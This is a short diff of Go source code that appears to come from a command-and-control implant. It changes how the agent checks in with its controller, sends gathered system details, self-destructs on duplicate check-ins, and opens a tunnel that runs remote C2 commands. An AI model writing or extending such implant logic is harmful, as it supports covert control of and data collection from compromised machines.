@@ -180,7 +180,7 @@ connect:
 	if !isCheckedIn {
 		logging.Printf("Checking in on %s", def.CCAddress)
 		// check in with system info
-		err = c2transport.ReportStatus(agentutils.GatherSystemDetails())
+		err = c2transport.ReportStatus(common.RuntimeConfig, agentutils.GatherSystemDetails())
 		if err != nil {
 			if strings.Contains(err.Error(), "self-destruct") {
 				logging.Fatalf("Duplicated checkin, self-destructing...")
@@ -207,7 +207,7 @@ connect:
 	}
 	def.KCPKeep = true
 	logging.Println("Connecting to message tunnel...")
-	c2transport.MsgTunneler(handler.HandleC2Command, ctx, cancel)
+	c2transport.MsgTunneler(def.CCMsgConn, common.RuntimeConfig, handler.HandleC2Command, ctx, cancel)
 	logging.Printf("Message tunnel closed, reconnecting")
 	goto connect
 }
